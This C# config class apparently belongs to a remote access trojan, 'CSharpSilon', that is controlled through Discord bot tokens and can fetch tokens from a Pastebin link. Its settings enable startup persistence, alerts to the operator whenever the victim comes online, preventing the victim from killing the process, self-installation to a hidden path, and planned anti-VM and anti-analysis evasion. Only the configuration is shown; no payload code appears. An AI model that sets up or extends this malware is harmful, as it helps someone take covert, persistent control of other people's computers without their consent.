namespace CSharpSilon.Utils
{
    public class Config
    {
        // Leave This Empty, It Gets Set When Checking What Bot Tokens Are Valid
        public static string UsedToken;
        
        // Set This To Your OWN GuildID
        public static readonly ulong GuildID = 1234567890123456789;
        
        // This Only Gets Used If Pastebin Is Disabled, OR If Pastebin Is Enabled And The Token On The Pastebin Is Invalid.
        public static string[] Tokens = new string[] { "YOUR_TOKEN1", "YOUR_TOKEN2", "YOUR_TOKEN3", };

        
        // Use This To Decide If You're Going To Be Using Pastebin Or Not
        public static bool Pastebin = false;
        
        // Make Sure The Link Is The Raw Version. Example: https://pastebin.com/raw/...
        public static string PastebinLink = "";
        
        
        public static string Prefix = "?";
        public static bool OnStartup = false; // Want The Bot To Get Put On Startup Automatically?
        public static bool StartupPing = false; // Want To Get Pinged Whenever The User's Online?
        public static bool StartupMessage = true; // Want To Know When The User's Come Online?
        public static bool AntiKill; // Want The User To Never Be Able To Kill The Process?
        public static bool AntiVm; // Want It To Not Flag Common VMs? (Not Implemented Yet!!)
        public static bool AntiAnalysis; // Want It To Not Be Analyzed? (Not Implemented Yet!!)
        public static bool Install = true; // Want This To Install Itself Into A Different Path?
    }
}